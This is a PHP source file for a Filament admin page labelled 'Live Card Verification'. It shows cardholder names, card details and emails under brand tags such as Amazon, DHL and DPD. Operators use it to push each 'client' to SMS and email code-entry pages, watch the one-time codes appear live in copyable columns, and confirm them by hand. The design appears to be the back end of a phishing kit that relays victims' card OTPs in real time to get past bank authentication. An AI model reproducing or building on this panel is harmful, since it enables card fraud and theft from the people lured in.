<?php

namespace App\Filament\Pages;

use App\Models\CardVerification;
use App\Events\CardVerificationUpdated;
use Filament\Pages\Page;
use Filament\Tables;
use Filament\Tables\Concerns\InteractsWithTable;
use Filament\Tables\Contracts\HasTable;
use Filament\Tables\Table;
use Filament\Tables\Filters\SelectFilter;
use Filament\Tables\Actions\Action;
use Filament\Notifications\Notification;
use Illuminate\Support\Facades\Crypt;

class LiveCardVerificationPanel extends Page implements HasTable
{
    use InteractsWithTable;

    protected static ?string $navigationIcon = 'heroicon-o-credit-card';
    protected static ?string $navigationLabel = 'Live Card Verification';
    protected static ?string $navigationGroup = 'KYC Management';
    protected static ?int $navigationSort = 1;
    protected static string $view = 'filament.pages.live-card-verification-panel';

    public function table(Table $table): Table
    {
        return $table
            ->query(CardVerification::query()->with(['brand', 'reviewer'])->latest())
            ->columns([
                Tables\Columns\TextColumn::make('uuid')
                    ->label('ID')
                    ->limit(8)
                    ->copyable()
                    ->tooltip(fn ($record) => $record->uuid),

                Tables\Columns\TextColumn::make('brand.name')
                    ->badge()
                    ->color(fn (string $state): string => match ($state) {
                        'Walmart' => 'info',
                        'Amazon' => 'warning',
                        'DPD' => 'danger',
                        'DHL' => 'success',
                        default => 'gray',
                    }),

                Tables\Columns\TextColumn::make('cardholder_name')
                    ->label('Name')
                    ->searchable()
                    ->weight('bold'),

                Tables\Columns\TextColumn::make('card_number_masked')
                    ->label('Card')
                    ->icon('heroicon-o-credit-card')
                    ->formatStateUsing(fn ($record) => $record->card_number_masked . ' (' . strtoupper($record->card_type ?? '?') . ')'),

                Tables\Columns\TextColumn::make('card_expiry')
                    ->label('Exp'),

                Tables\Columns\TextColumn::make('email')
                    ->searchable()
                    ->limit(25),

                Tables\Columns\TextColumn::make('status')
                    ->badge()
                    ->color(fn (string $state): string => match ($state) {
                        'pending' => 'gray',
                        'awaiting_sms' => 'warning',
                        'sms_code_entered' => 'info',
                        'sms_confirmed' => 'success',
                        'sms_rejected' => 'danger',
                        'awaiting_email' => 'warning',
                        'email_code_entered' => 'info',
                        'email_confirmed' => 'success',
                        'email_rejected' => 'danger',
                        'verified' => 'success',
                        'failed' => 'danger',
                        default => 'gray',
                    }),

                // Live SMS code column — appears when client enters code
                Tables\Columns\TextColumn::make('sms_code')
                    ->label('SMS Code')
                    ->placeholder('—')
                    ->weight('bold')
                    ->color('info')
                    ->copyable(),

                // Live Email code column
                Tables\Columns\TextColumn::make('email_code')
                    ->label('Email Code')
                    ->placeholder('—')
                    ->weight('bold')
                    ->color('info')
                    ->copyable(),

                Tables\Columns\TextColumn::make('created_at')
                    ->since()
                    ->sortable(),
            ])
            ->filters([
                SelectFilter::make('brand')
                    ->relationship('brand', 'name'),
                SelectFilter::make('status')
                    ->options([
                        'pending' => 'Pending',
                        'awaiting_sms' => 'Awaiting SMS',
                        'sms_code_entered' => 'SMS Code Entered',
                        'sms_confirmed' => 'SMS Confirmed',
                        'sms_rejected' => 'SMS Rejected',
                        'awaiting_email' => 'Awaiting Email',
                        'email_code_entered' => 'Email Code Entered',
                        'email_confirmed' => 'Email Confirmed',
                        'email_rejected' => 'Email Rejected',
                        'verified' => 'Verified',
                        'failed' => 'Failed',
                    ]),
            ])
            ->actions([
                // === STEP 1: Request SMS Code ===
                Action::make('request_sms')
                    ->label('Request SMS')
                    ->icon('heroicon-o-device-phone-mobile')
                    ->color('warning')
                    ->visible(fn ($record) => in_array($record->status, ['pending', 'sms_rejected']))
                    ->requiresConfirmation()
                    ->modalHeading('Request SMS Verification')
                    ->modalDescription(fn ($record) => "This will redirect {$record->cardholder_name} to the SMS code entry page.")
                    ->action(function ($record) {
                        $record->update([
                            'status' => 'awaiting_sms',
                            'sms_requested_at' => now(),
                            'sms_code' => null, // Reset previous code
                        ]);
                        $record->load('brand');
                        broadcast(new CardVerificationUpdated($record));
                        Notification::make()
                            ->success()
                            ->title('SMS verification requested')
                            ->body("Client will be redirected to SMS code entry page.")
                            ->send();
                    }),

                // === STEP 2: Confirm SMS Code (appears when code is entered) ===
                Action::make('confirm_sms')
                    ->label(fn ($record) => 'SMS: ' . ($record->sms_code ?? '—'))
                    ->icon('heroicon-o-check-circle')
                    ->color('success')
                    ->visible(fn ($record) => $record->status === 'sms_code_entered')
                    ->requiresConfirmation()
                    ->modalHeading('Confirm SMS Code')
                    ->modalDescription(fn ($record) => "Client entered SMS code: **{$record->sms_code}**\n\nIs this code correct?")
                    ->action(function ($record) {
                        $record->update([
                            'sms_code_valid' => true,
                            'status' => 'sms_confirmed',
                            'reviewed_by' => auth()->id(),
                        ]);
                        $record->load('brand');
                        broadcast(new CardVerificationUpdated($record));
                        Notification::make()
                            ->success()
                            ->title('SMS code confirmed')
                            ->send();
                    }),

                Action::make('reject_sms')
                    ->label('Reject SMS')
                    ->icon('heroicon-o-x-circle')
                    ->color('danger')
                    ->visible(fn ($record) => $record->status === 'sms_code_entered')
                    ->requiresConfirmation()
                    ->action(function ($record) {
                        $record->update([
                            'sms_code_valid' => false,
                            'status' => 'sms_rejected',
                            'reviewed_by' => auth()->id(),
                        ]);
                        $record->load('brand');
                        broadcast(new CardVerificationUpdated($record));
                        Notification::make()
                            ->danger()
                            ->title('SMS code rejected')
                            ->send();
                    }),

                // === STEP 3: Request Email Code ===
                Action::make('request_email')
                    ->label('Request Email')
                    ->icon('heroicon-o-envelope')
                    ->color('warning')
                    ->visible(fn ($record) => in_array($record->status, ['sms_confirmed', 'email_rejected']))
                    ->requiresConfirmation()
                    ->modalHeading('Request Email Verification')
                    ->modalDescription(fn ($record) => "This will redirect {$record->cardholder_name} to the Email code entry page.")
                    ->action(function ($record) {
                        $record->update([
                            'status' => 'awaiting_email',
                            'email_requested_at' => now(),
                            'email_code' => null,
                        ]);
                        $record->load('brand');
                        broadcast(new CardVerificationUpdated($record));
                        Notification::make()
                            ->success()
                            ->title('Email verification requested')
                            ->body("Client will be redirected to email code entry page.")
                            ->send();
                    }),

                // === STEP 4: Confirm Email Code ===
                Action::make('confirm_email')
                    ->label(fn ($record) => 'Email: ' . ($record->email_code ?? '—'))
                    ->icon('heroicon-o-check-circle')
                    ->color('success')
                    ->visible(fn ($record) => $record->status === 'email_code_entered')
                    ->requiresConfirmation()
                    ->modalHeading('Confirm Email Code')
                    ->modalDescription(fn ($record) => "Client entered email code: **{$record->email_code}**\n\nIs this code correct?")
                    ->action(function ($record) {
                        $record->update([
                            'email_code_valid' => true,
                            'status' => 'email_confirmed',
                            'reviewed_by' => auth()->id(),
                        ]);
                        $record->load('brand');
                        broadcast(new CardVerificationUpdated($record));
                        Notification::make()
                            ->success()
                            ->title('Email code confirmed')
                            ->send();
                    }),

                Action::make('reject_email')
                    ->label('Reject Email')
                    ->icon('heroicon-o-x-circle')
                    ->color('danger')
                    ->visible(fn ($record) => $record->status === 'email_code_entered')
                    ->requiresConfirmation()
                    ->action(function ($record) {
                        $record->update([
                            'email_code_valid' => false,
                            'status' => 'email_rejected',
                            'reviewed_by' => auth()->id(),
                        ]);
                        $record->load('brand');
                        broadcast(new CardVerificationUpdated($record));
                        Notification::make()
                            ->danger()
                            ->title('Email code rejected')
                            ->send();
                    }),

                // === FINAL: Mark Verified or Failed ===
                Action::make('verify')
                    ->label('✓ Verify Card')
                    ->icon('heroicon-o-shield-check')
                    ->color('success')
                    ->visible(fn ($record) => in_array($record->status, ['email_confirmed', 'sms_confirmed']))
                    ->requiresConfirmation()
                    ->modalHeading('Complete Card Verification')
                    ->modalDescription('Mark this card as fully verified?')
                    ->action(function ($record) {
                        $record->update([
                            'status' => 'verified',
                            'verified_at' => now(),
                            'reviewed_by' => auth()->id(),
                        ]);
                        $record->load('brand');
                        broadcast(new CardVerificationUpdated($record));
                        Notification::make()
                            ->success()
                            ->title('Card verified successfully')
                            ->send();
                    }),

                Action::make('fail')
                    ->label('✗ Fail')
                    ->icon('heroicon-o-x-mark')
                    ->color('danger')
                    ->visible(fn ($record) => !in_array($record->status, ['verified', 'failed']))
                    ->requiresConfirmation()
                    ->form([
                        \Filament\Forms\Components\Textarea::make('notes')
                            ->label('Reason')
                            ->placeholder('Why is this verification failing?'),
                    ])
                    ->action(function ($record, array $data) {
                        $record->update([
                            'status' => 'failed',
                            'admin_notes' => $data['notes'] ?? null,
                            'reviewed_by' => auth()->id(),
                        ]);
                        $record->load('brand');
                        broadcast(new CardVerificationUpdated($record));
                        Notification::make()
                            ->danger()
                            ->title('Card verification failed')
                            ->send();
                    }),

                // === View full card details ===
                Action::make('view_details')
                    ->label('Details')
                    ->icon('heroicon-o-eye')
                    ->color('gray')
                    ->modalHeading(fn ($record) => 'Card Details — ' . $record->cardholder_name)
                    ->modalContent(fn ($record) => view('filament.pages.card-details-modal', [
                        'card' => $record,
                    ]))
                    ->modalSubmitAction(false),
            ])
            ->poll('3s'); // Auto-refresh every 3 seconds for live updates
    }
}
